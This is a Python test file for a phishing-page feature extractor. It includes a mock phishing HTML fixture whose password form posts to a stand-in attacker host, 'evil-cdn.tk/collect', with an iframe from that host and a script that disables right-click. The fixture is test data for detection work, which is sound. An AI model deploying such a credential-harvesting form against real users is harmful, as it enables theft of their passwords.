from app.ml.features.web_features import extract_web_features, WEB_FEATURE_NAMES

PHISHING_HTML = """<html><head><link rel="icon" href="http://evil-cdn.tk/fav.ico"></head>
<body>
<form action="http://evil-cdn.tk/collect"><input type="password"></form>
<iframe src="http://evil-cdn.tk/x"></iframe>
<a href="http://paypal.com">PayPal</a>
<script>document.oncontextmenu = function() { return false; };</script>
</body></html>"""

LEGIT_HTML = """<html><head><link rel="icon" href="/favicon.ico"></head>
<body>
<form action="/login"><input type="password"></form>
<a href="/about">About</a>
<a href="/contact">Contact</a>
</body></html>"""


def test_feature_vector_has_all_expected_keys():
    feats = extract_web_features("http://example.com", html=LEGIT_HTML, use_network=False)
    assert set(feats.keys()) == set(WEB_FEATURE_NAMES)


def test_external_favicon_flagged():
    feats = extract_web_features("http://mysite.tk", html=PHISHING_HTML, use_network=False)
    assert feats["favicon_external"] == -1


def test_iframe_detected():
    feats = extract_web_features("http://mysite.tk", html=PHISHING_HTML, use_network=False)
    assert feats["iframe_present"] == -1


def test_form_handler_external_flagged():
    feats = extract_web_features("http://mysite.tk", html=PHISHING_HTML, use_network=False)
    assert feats["server_form_handler"] in (-1, 0)


def test_legit_page_features_look_clean():
    feats = extract_web_features("http://example.com", html=LEGIT_HTML, use_network=False)
    assert feats["favicon_external"] == 1
    assert feats["iframe_present"] == 1
    assert feats["server_form_handler"] == 1


def test_ip_hostname_flagged():
    feats = extract_web_features("http://192.168.1.5/login", html="", use_network=False)
    assert feats["using_ip"] == -1
